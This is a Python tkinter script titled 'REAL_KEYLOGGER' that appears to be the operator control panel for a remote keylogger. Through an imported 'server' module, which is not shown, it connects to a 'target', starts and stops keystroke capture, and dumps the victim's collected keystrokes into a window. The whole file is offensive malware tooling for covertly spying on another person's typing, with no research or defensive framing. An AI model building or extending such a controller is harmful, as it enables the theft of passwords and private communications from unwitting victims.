#!/usr/bin/python3

from tkinter import *
import tkinter.font
import server
import time

root = Tk()
root.title("REAL_KEYLOGGER")
root.geometry("460x620")
root.config(bg = "black")

font = tkinter.font.Font(family = "Helvetica", size = 12, weight = "bold")


def start():
    server.target_communication("keylog_start")

def dump():
    server.target_communication("keylog_dump")

def save():
    pass

def quit():
    server.target_communication("keylog_stop")

def listen():
    server.establish_communication()

button_start = Button(root, text = "START TO COLLECT THE KEYS", padx = 60, pady = 25, activebackground = "#26b78d", bg = "#26b78d", font = font, command = start)

button_dump = Button(root, text = "DUMP COLLECTED KEYSTROKES HERE", padx = 60, pady = 25, activebackground = "#26b78d", bg = "#26b78d", font = font, command = dump)

button_quit = Button(root, text = "FINISH AND QUIT", padx = 60, pady = 25,  activebackground = "#26b78d", bg = "#26b78d", font = font, command = quit)

button_listen = Button(root, text = "Search for target", activebackground = "#26b78d", bg = "#26b78d", command = listen)

label = Label(text = "", fg = "white", bg = "black", bd = None)

key_label = Label(text = "", bg = "grey", bd = 3, width = 55, height = 13, anchor = "nw")


button_listen.place(x = 160, y = 5)
button_start.place(x = 45, y = 50)
button_dump.place(x = 5, y = 225)
button_quit.place(x = 80, y = 555)
label.place(x = 20, y = 145)
key_label.place(x = 5, y = 315)


def Handler(identifier):
    if identifier == "[+] Keylogger Started!" or identifier == "Keylogger finished":
        label["text"] = identifier
    else:
        key_label["text"] = identifier


server.attachHandler(Handler)

root.mainloop()
